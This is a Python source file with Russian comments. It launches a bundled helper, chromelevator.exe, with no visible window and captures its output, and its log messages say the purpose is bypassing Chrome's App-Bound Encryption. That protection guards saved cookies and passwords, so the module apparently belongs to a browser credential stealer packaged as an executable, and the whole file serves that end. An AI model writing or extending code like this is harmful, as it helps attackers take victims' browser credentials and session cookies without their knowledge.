import subprocess
import os
import sys

def run_chromelevator(log_callback=None):
    """Запуск chromelevator.exe"""

    if getattr(sys, 'frozen', False):
        base_path = sys._MEIPASS
    else:
        base_path = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))

    exe_path = os.path.join(base_path, "chrom_elevator", "chromelevator.exe")

    if not os.path.exists(exe_path):
        if log_callback:
            log_callback("[!] chromelevator.exe не найден!")
            log_callback(f"    Путь: {exe_path}")
            log_callback("    Переименуйте chromelevator_x64 в chromelevator.exe")
        return None

    try:
        if log_callback:
            log_callback("[*] Запуск chromelevator.exe для обхода App-Bound...")

        # Пробуем запустить с разными параметрами
        result = subprocess.run(
            [exe_path, "all", "--quiet"],
            capture_output=True,
            text=True,
            timeout=120,
            creationflags=subprocess.CREATE_NO_WINDOW
        )

        if log_callback:
            log_callback(f"[+] chromelevator.exe завершён (код: {result.returncode})")
            if result.stdout:
                log_callback("   Вывод: " + result.stdout.strip()[:200])

        return result.stdout

    except Exception as e:
        if log_callback:
            log_callback(f"[!] Ошибка запуска chromelevator.exe: {e}")
        return None